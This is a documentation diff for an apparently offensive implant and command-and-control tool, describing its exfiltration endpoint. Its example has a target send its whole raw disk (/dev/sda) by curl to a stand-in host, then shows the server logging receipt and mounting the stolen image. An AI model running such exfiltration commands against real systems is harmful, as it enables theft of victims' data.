@@ -210,15 +210,29 @@ The maximum size of efxil which will be saved defaults to 100MB but may be set
 using the `-exfil-max` flag when starting the server.  Exfil handling may be
 disabled altogether with `-exfil-max 0`.
 
+The first element of the path after `/p` is assumed to be an Implant ID, though
+in practice this isn't strictly necessary.  Using an Implant ID has the nice
+effect of showing it if that ID has been selected with `,seti`.
+
 ### Example
 #### Target:
+Send back a largeish file from implant `kittens`.
 ```sh
 # This is a pretty terrible idea, unless the target has a really tiny disk.
-curl --data-binary @/dev/sda https://example.com/p/kittens/dev/sda
+curl -sT /dev/sda https://example.com/p/kittens/dev/sda
 # Neat party trick, though.
 ```
+
+#### Client:
+It's made it back.
+```
+2024/01/20 00:40:19 [EXFIL] Wrote 26214400 bytes from 127.0.0.1:38644 to
+/home/h4x0r/plonk.d/exfil/kittens/dev/sda
+```
+
 #### Server:
+Make use of the exfil'd file.
 ```sh
-doas vnconfig vnd0 ~/exfil/kittens/dev/sda1
+doas vnconfig vnd0 ~/plonk.d/exfil/kittens/dev/sda
 doas mount /dev/vnd0i /mnt
 ```
